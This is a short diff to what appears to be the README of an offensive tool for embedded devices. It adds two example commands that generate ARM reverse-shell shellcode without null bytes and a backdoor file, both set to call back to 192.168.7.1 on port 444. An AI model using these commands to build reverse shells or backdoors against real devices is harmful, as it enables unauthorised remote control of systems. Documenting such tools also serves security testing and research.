@@ -47,9 +47,15 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ​	**Here is the example that generates reverse_shellcode without null bytes**
 
+```
+hackEmbedded_tool -reverse_ip 192.168.7.1 -reverse_port 444 -arch arm -endian little -exploit_shellcode 1
+```
 ![image-20220428161403858](./img/image-20220428161403858.png)
 
-**Here is the example that generates reverse_shellcode without null bytes**
+**This is the usage list for generating the backdoor file of the corresponding schema**
+```
+hackEmbedded_tool -reverse_ip 192.168.7.1 -reverse_port 444 -arch arm -endian little -backdoor_file 1
+```
 
 ![image-20220428161757170](./img/image-20220428161757170.png)
 
